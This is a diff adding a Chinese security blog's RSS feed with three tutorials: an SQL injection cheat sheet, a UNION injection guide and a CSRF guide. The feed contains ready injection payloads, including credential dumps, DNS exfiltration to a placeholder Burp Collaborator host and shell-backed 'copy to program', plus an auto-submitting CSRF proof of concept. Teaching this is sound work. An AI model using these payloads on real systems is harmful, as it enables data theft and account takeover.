@@ -1,0 +1,1568 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>WEB on All-on&#39;s Blog</title>
+    <link>https://all-on.github.io/categories/web/</link>
+    <description>Recent content in WEB on All-on&#39;s Blog</description>
+    <generator>Hugo</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Fri, 19 Jun 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://all-on.github.io/categories/web/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SQL注入速查表</title>
+      <link>https://all-on.github.io/posts/web/sql/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</link>
+      <pubDate>Fri, 19 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/sql/sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E8%A1%A8/</guid>
+      <description>&lt;p&gt;来源于&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34;&gt;官方手册&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;字符串连接-string-concatenation&#34;&gt;字符串连接 String concatenation&lt;/h2&gt;
+&lt;p&gt;把多条字符串串接起来，形成一个字符串。&lt;/p&gt;
+&lt;table&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th&gt;&lt;/th&gt;
+					&lt;th&gt;&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Oracle&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;&#39;foo&#39;&lt;/code&gt;||&lt;code&gt;&#39;bar&#39;&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;Microsoft&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;&#39;foo&#39;+&#39;bar&#39;&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;PostgreSQL&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;&#39;foo&#39;&lt;/code&gt;||&lt;code&gt;&#39;bar&#39;&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;MySQL&lt;/td&gt;
+					&lt;td&gt;&lt;code&gt;&#39;foo&#39; &#39;bar&#39;&lt;/code&gt; # 注意中间的空格  &lt;br&gt;&lt;code&gt;CONCAT(&#39;foo&#39;,&#39;bar&#39;)&lt;/code&gt;&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;字串-substring&#34;&gt;字串 Substring&lt;/h2&gt;
+&lt;p&gt;可以从指定偏移量和长度中提取字符串的一部分。注意，偏移指数是以1为基础。以下每个表达式都会返回字符串 。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<p>来源于<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">官方手册</a></p>
+<h2 id="字符串连接-string-concatenation">字符串连接 String concatenation</h2>
+<p>把多条字符串串接起来，形成一个字符串。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>'foo'</code>||<code>'bar'</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>'foo'+'bar'</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>'foo'</code>||<code>'bar'</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>'foo' 'bar'</code> # 注意中间的空格  <br><code>CONCAT('foo','bar')</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="字串-substring">字串 Substring</h2>
+<p>可以从指定偏移量和长度中提取字符串的一部分。注意，偏移指数是以1为基础。以下每个表达式都会返回字符串 。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>SUBSTR('foobar', 4, 2)</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>SUBSTRING('foobar', 4, 2)</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>SUBSTRING('foobar', 4, 2)</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>SUBSTRING('foobar', 4, 2)</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="注释-comments">注释 Comments</h2>
+<p>用注释来截断查询，并删除跟随输入的原始查询部分。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>--comment   </code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>--comment   /*comment*/</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>--comment   /*comment*/</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>#comment</code>  <br><code>-- comment</code> # 注意双划号后的空格，等同于加号<code>+</code>  <br><code>/*comment*/</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="数据库版本-database-version">数据库版本 Database version</h2>
+<p>查询数据库以确定其类型和版本。这些信息在制定更复杂的攻击时非常有用。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>SELECT banner FROM v$version   SELECT version FROM v$instance   </code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>SELECT @@version</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>SELECT version()</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>SELECT @@version</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>banner是 Oracle 数据库中的一个元数据列，它包含了数据库的版本信息和其他相关信息。在 Oracle 数据库中，可以通过查询 <code>v$version</code> 视图来获取 <code>BANNER</code> 列的值。</p>
+<h2 id="数据库内容-database-contents">数据库内容 Database contents</h2>
+<p>列出数据库中存在的表格，以及这些表格中包含的列。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   </code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   </code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   </code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="条件错误-conditional-errors">条件错误 Conditional errors</h2>
+<p>可以测试单个布尔条件，如果条件为真，就会触发数据库错误。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="通过可见错误信息提取数据-extracting-data-via-visible-error-messages">通过可见错误信息提取数据 Extracting data via visible error messages</h2>
+<p>引发错误信息，泄露恶意查询返回的敏感数据。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>SELECT 'foo' WHERE 1 = (SELECT 'secret')</code> <br> <code>&gt; Conversion failed when converting the varchar value 'secret' to data type int.</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>SELECT CAST((SELECT password FROM users LIMIT 1) AS int)</code> <br> <code>&gt; invalid input syntax for integer: &quot;secret&quot;</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))</code> <br> <code>&gt; XPATH syntax error: '\secret'</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="堆叠查询-batched-or-stacked-queries">堆叠查询 Batched (or stacked) queries</h2>
+<p>注意，在后续查询执行时，结果不会返回给应用程序。因此，这种技术主要用于盲目漏洞，即通过第二次查询触发DNS查询、条件错误或时间延迟。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td>不支持</td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>QUERY-1-HERE; QUERY-2-HERE</code> <br> <code>QUERY-1-HERE QUERY-2-HERE</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
+			</tr>
+	</tbody>
+</table>
+<blockquote>
+<p>[!note] 注释
+MySQL 中，批处理查询通常不能用于 SQL 注入。然而，如果目标应用程序使用某些PHP或Python API与MySQL数据库通信，这种情况有时是可能的。</p>
+</blockquote>
+<h2 id="时间延迟-time-delays">时间延迟 Time delays</h2>
+<p>在数据库中造成时间延迟。以下情况将导致无条件延迟10秒。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>dbms_pipe.receive_message(('a'),10)</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>WAITFOR DELAY '0:0:10'</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>SELECT pg_sleep(10)</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>SELECT SLEEP(10)</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="条件时间延迟-conditional-time-delays">条件时间延迟 Conditional time delays</h2>
+<p>测试一个布尔条件，如果条件为真，触发时间延迟。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'</code>||<code>dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td><code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="dns-查询">DNS 查询</h2>
+<p>让数据库对外部域名进行DNS查询。为此，需要使用Burp Collaborator生成一个独特的 Burp Collaborator 子域名，用于攻击，然后轮询 Collaborator 服务器以确认 DNS 查询是否发生。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td>（XXE）漏洞可触发DNS查询。该漏洞已被修补，但仍有许多未修补的 Oracle 安装系统存在:<br><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual</code><br><br>以下技术适用于完全打补丁的 Oracle 安装，但需要更高的权限：<br><code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td>以下技术仅适用于Windows：<br><br><code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code>  <br><code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></td>
+			</tr>
+	</tbody>
+</table>
+<h2 id="带数据外泄的dns查询">带数据外泄的DNS查询</h2>
+<p>让数据库对包含注入查询结果的外部域名进行DNS查询。为此，需要使用Burp Collaborator生成一个独特的 Burp Collaborator 子域，用于攻击，然后轮询 Collaborator 服务器，获取任何 DNS 交互的详细信息，包括被泄露的数据。</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Oracle</td>
+					<td><code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://'</code>||<code>(SELECT YOUR-QUERY-HERE)</code>||<code>'.BURP-COLLABORATOR-SUBDOMAIN/&quot;&gt; %remote;]&gt;'),'/l') FROM dual</code></td>
+			</tr>
+			<tr>
+					<td>Microsoft</td>
+					<td><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree &quot;//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a&quot;')</code></td>
+			</tr>
+			<tr>
+					<td>PostgreSQL</td>
+					<td><code>create OR replace function f() returns void as $$</code> <br> <code>declare c text;</code> <br> <code>declare p text;</code> <br> <code>begin</code> <br> <code>SELECT into p (SELECT YOUR-QUERY-HERE);</code> <br> <code>c := 'copy (SELECT '''') to program ''nslookup '</code>||<code>p</code>||<code>'.BURP-COLLABORATOR-SUBDOMAIN''';</code> <br> <code>execute c;</code> <br> <code>END;</code> <br> <code>$$ language plpgsql security definer;</code> <br> <code>SELECT f();</code></td>
+			</tr>
+			<tr>
+					<td>MySQL</td>
+					<td>以下技术仅适用于Windows： <br><code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code></td>
+			</tr>
+	</tbody>
+</table>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Union注入</title>
+      <link>https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/</link>
+      <pubDate>Mon, 11 May 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/sql/union%E6%B3%A8%E5%85%A5/</guid>
+      <description>&lt;h2 id=&#34;确定所需列数&#34;&gt;确定所需列数&lt;/h2&gt;
+&lt;p&gt;有两种方式。一种是&lt;code&gt;order by 3-- &lt;/code&gt;：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; ORDER BY 1-- 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; ORDER BY 2-- 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; ORDER BY 3-- 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;另一种是提交一系列指定不同数量空值的有效载荷：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL-- 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL,NULL-- 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#39; UNION SELECT NULL,NULL,NULL-- 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果测试的列数大于实际列数，就会报错&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="确定所需列数">确定所需列数</h2>
+<p>有两种方式。一种是<code>order by 3-- </code>：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; ORDER BY 1-- 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; ORDER BY 2-- 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; ORDER BY 3-- 
+</span></span></code></pre></div><p>另一种是提交一系列指定不同数量空值的有效载荷：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT NULL-- 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; UNION SELECT NULL,NULL-- 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; UNION SELECT NULL,NULL,NULL-- 
+</span></span></code></pre></div><p>如果测试的列数大于实际列数，就会报错</p>
+<h2 id="找出字符串数据匹配的列">找出字符串数据匹配的列</h2>
+<p>想要检索的有趣数据通常是字符串形式。这意味着需要在原始查询结果中找到一个或多个列，其数据类型是字符串数据，或者与字符串数据兼容。
+确定所需列数后，可以探测每个列是否能存储字符串数据。提交一系列负载，依次为每列放置字符串值。例如，如果查询返回四列，将提交：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT &#39;a&#39;,NULL,NULL,NULL-- 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; UNION SELECT NULL,&#39;a&#39;,NULL,NULL-- 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">&#39; UNION SELECT NULL,NULL,&#39;a&#39;,NULL-- 
+</span></span><span class="line"><span class="ln">4</span><span class="cl">&#39; UNION SELECT NULL,NULL,NULL,&#39;a&#39;-- 
+</span></span></code></pre></div><p>如果列数据类型与字符串数据不兼容，注入查询将引发数据库错误。</p>
+<h2 id="一个字段检索出多个值">一个字段检索出多个值</h2>
+<p>在某些情况下，前例中的查询可能只返回一列。例如，已知有两列，只有第二字段是字符串类型，这意味着第一列总是需要用空值来占位。所以不能像之前一样，直接在两列位置查询用户名和密码。
+这时可以通过将多个值串接在一起，在这一列内检索多个值。添加分隔符来区分合并后的值。例如，在Oracle上提交以下输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; UNION SELECT username||&#39;~&#39;||password FROM users-- 
+</span></span></code></pre></div><p>这使用了 Oracle 上的字符串串接算子 double-pipe 序列<code>||</code>。注入查询将<code>username</code>和<code>password</code>字段的值串接在一起，中间用字符<code>~</code>分隔。
+查询结果包含所有用户名和密码，例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">... 
+</span></span><span class="line"><span class="ln">2</span><span class="cl">administrator~s3cure 
+</span></span><span class="line"><span class="ln">3</span><span class="cl">wiener~peter 
+</span></span><span class="line"><span class="ln">4</span><span class="cl">carlos~montoya 
+</span></span><span class="line"><span class="ln">5</span><span class="cl">...
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>CSRF</title>
+      <link>https://all-on.github.io/posts/web/csrf/</link>
+      <pubDate>Fri, 01 May 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/csrf/</guid>
+      <description>&lt;p&gt;跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。
+CSRF需要3个条件：&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<p>跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。
+CSRF需要3个条件：</p>
+<ul>
+<li><strong>一个相关的行动</strong>。在应用中，攻击者有理由诱导某个动作。这可能是特权作（例如修改其他用户的权限）或对用户特定数据的任何作（例如更改用户自己的密码）。</li>
+<li><strong>基于Cookie的会话处理</strong>。CSRF通常以基于cookie的会话处理为基础来描述，但它也出现在应用程序自动为请求添加某些用户凭证的情境中，如HTTP Basic认证和基于证书的认证。</li>
+<li><strong>没有不可预测的请求参数</strong>。</li>
+</ul>
+<h2 id="无防御的-csrf-漏洞">无防御的 CSRF 漏洞</h2>
+<p>如果一个应用程序包含一个功能，允许用户更改账户中的电子邮件地址，且该过程符合CSRF的3个要求。攻击者可以构建包含以下HTML的网页：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;https://vulnerable-website.com/email/change&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;email&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;pwned@evil-user.net&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">            <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>如果受害者用户访问攻击者的网页，攻击者的页面会触发对受攻击网站的HTTP请求。如果用户登录了易受攻击的网站，其浏览器会自动在请求中包含会话Cookie。受攻击的网站会以正常方式处理请求，视为受害用户发出，并更改其电子邮件地址。</p>
+<p>要快速利用CSRF漏洞，可以使用Burp的右键<code>“参与度工具”-&gt;“CSRF PoC”</code>。</p>
+<p>例如，对于这样一个没有防御措施的CSRF漏洞，完全可以在更改邮件地址的时候抓包，生成利用漏洞的html。当然，需要勾选“包括自动提交脚本”选项，并将更新后的邮件地址改一下即可。</p>
+<h2 id="绕过-csrf-令牌验证">绕过 CSRF 令牌验证</h2>
+<p>防御CSRF攻击最有效的方法是在相关请求中包含CSRF令牌。该令牌必须满足以下条件：</p>
+<ul>
+<li>高熵时，这种不可预测性，就像会话令牌一样。</li>
+<li>绑定在用户会话。</li>
+<li>在执行相关操作前，在每种情况下都经过严格验证。</li>
+</ul>
+<p>CSRF 令牌应被视为机密，并在整个生命周期内以安全方式处理。一种通常有效的方法是通过POST方法提交的HTML表单中的隐藏字段内将令牌传输给客户端。随后，该令牌将在表单提交时作为请求参数包含：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;input type=&#34;hidden&#34; name=&#34;csrf-token&#34; value=&#34;CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&#34; /&gt;
+</span></span></code></pre></div><p>为了进一步安全，包含CSRF令牌的字段应尽早放置在HTML文档中，理想情况下应放在任何非隐藏输入字段之前，以及HTML中嵌入用户可控制数据的位置之前。另一种方法是将令牌放入 URL 查询字符串中，安全性较差。</p>
+<h3 id="依赖于请求方法">依赖于请求方法</h3>
+<p>有些应用程序在请求使用 POST 方法时正确验证令牌，但使用 GET 方法时跳过验证。在这种情况下，攻击者可以切换到GET方法绕过验证，发动CSRF攻击：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">GET /email/change?email=pwned@evil-user.net HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: vulnerable-website.com
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
+</span></span></code></pre></div><p>例如，在更改邮件地址的时候，可以更改请求方法为<code>GET</code>之后，再生成<code>CSRF PoC</code>进行攻击。</p>
+<h3 id="依赖于令牌的存在">依赖于令牌的存在</h3>
+<p>有些应用程序在令牌存在时会正确验证，但如果遗漏令牌则跳过验证。</p>
+<p>例如，在更改邮件地址的时候，直接删除<code>csrf</code>参数。</p>
+<h3 id="不绑定用户会话">不绑定用户会话</h3>
+<p>有些程序不会验证令牌是否属于发送请求的用户的同一个会话。相反，应用维护一个其已发行的全局令牌池，并接受该池中出现的任何令牌。于是，可以用自己的账户登录应用，获取有效的令牌，然后将该令牌传递给受害者用户进行CSRF攻击。</p>
+<p>例如，分别登录两个账户之后，对其中一个抓包。记录其<code>csrf</code>值之后丢弃。然后抓包另一个账户，覆盖<code>csrf</code>值并生成<code>PoC</code>。</p>
+<h3 id="绑定在非会话-cookie-上">绑定在非会话 cookie 上</h3>
+<p>当应用采用两个不同的框架时，很容易发生CSRF令牌绑定到一个Cookie上，但不绑定用于跟踪会话的同一个Cookie的情况。一个用于会话处理，另一个用于CSRF保护，且两者未集成。比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">POST /email/change HTTP/1.1
+</span></span><span class="line"><span class="ln">2</span><span class="cl">Host: vulnerable-website.com
+</span></span><span class="line"><span class="ln">3</span><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="ln">4</span><span class="cl">Content-Length: 68
+</span></span><span class="line"><span class="ln">5</span><span class="cl">Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
+</span></span><span class="line"><span class="ln">6</span><span class="cl">
+</span></span><span class="line"><span class="ln">7</span><span class="cl">csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com
+</span></span></code></pre></div><p>其中，Cookie中的<code>csrfKey</code>值就与<code>csrf</code>令牌关联，但不与Cookie本身关联。于是，可以将攻击者账户的<code>csrfKey</code>值与<code>csrf</code>值完整覆盖第1个用户的，从而实现<code>CSRF</code>攻击。</p>
